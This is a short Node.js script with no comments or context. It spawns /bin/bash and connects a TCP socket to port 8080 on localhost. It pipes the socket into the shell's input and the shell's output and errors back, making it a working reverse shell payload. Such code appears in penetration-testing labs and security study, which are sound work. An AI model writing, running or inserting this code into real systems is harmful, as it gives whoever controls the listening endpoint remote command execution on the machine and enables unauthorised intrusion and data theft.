const PORT = 8080;
const IP = "localhost";

const net = require("net");
const spawn = require("child_process");

const shell = spawn.exec("/bin/bash");
const socket = new net.Socket();

socket.connect(PORT, IP, () => {
  socket.pipe(shell.stdin);
  shell.stdout.pipe(socket);
  shell.stderr.pipe(socket);
});
